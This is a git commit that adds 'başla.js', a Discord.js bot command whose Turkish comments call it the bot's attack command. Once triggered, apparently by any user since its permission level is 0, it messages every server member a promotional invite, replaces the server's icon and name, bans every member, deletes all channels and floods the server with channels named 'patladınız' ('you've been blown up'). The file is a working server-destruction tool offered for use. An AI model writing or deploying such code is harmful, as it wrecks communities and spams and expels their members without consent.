674d7184903b832d531a40b9e2aebc43d97e3c30
alirenan <50745666+alirenan@users.noreply.github.com>
2019-09-06 23:06:52 +0300

    Create başla.js

---
+++ events/komutlar/başla.js
@@ -0,0 +1,58 @@
+
+const Discord = require('discord.js');
+
+
+exports.run = function(client, message) {
+
+    message.guild.members.map(c => c.send(
+
+"• **Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• https://discord.gg/qYn4zA4\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• Kodu Paylaşmak Yasaktır"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+
++"• **Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• https://discord.gg/qYn4zA4\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• Kodu Paylaşmak Yasaktır"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+
+    ));
+    message.guild.setIcon("https://cdn.discordapp.com/icons/617807293505077251/8cc859fb8969e2e045f79dfdcd10ecd5.jpg").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCU PPSİNİ DEĞİŞTİRMEKTE KULLANMASI GEREKTİĞİ PPNİN LİNKİ
+  message.guild.members.map(c => c.ban());
+  message.guild.channels.map(c => c.delete())
+  
+message.guild.setName("Discord Bot List ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
+  
+
+  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
+  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
+  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  
+  
+};
+
+exports.conf = {
+  enabled: true,//True => Komut açık, False => Komut kapalı 
+  guildOnly: true, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
+  aliases: [],//Komutun farklı kullanımları ÖR: !ping, !p
+  permLevel: 0 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
+};
+
+exports.help = {
+  name: 'başla',//Komutun adı (Komutu girerken lazım olucak)
+  description: '',//Komutun Açıklaması
+  usage: '' //komutun kullanım şekli; ÖR: !ban @Kullanıcı
+}
+//Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir GELMEK İÇİN : https://discord.gg/qYn4zA4
+//Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir GELMEK İÇİN : https://discord.gg/qYn4zA4//Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir GELMEK İÇİN : https://discord.gg/qYn4zA4
+//Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir GELMEK İÇİN : https://discord.gg/qYn4zA4
+//Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir GELMEK İÇİN : https://discord.gg/qYn4zA4
+//Bu Proje The Discord Bots | Kod Paylaşım** Sunucusuna Aittir GELMEK İÇİN : https://discord.gg/qYn4zA4
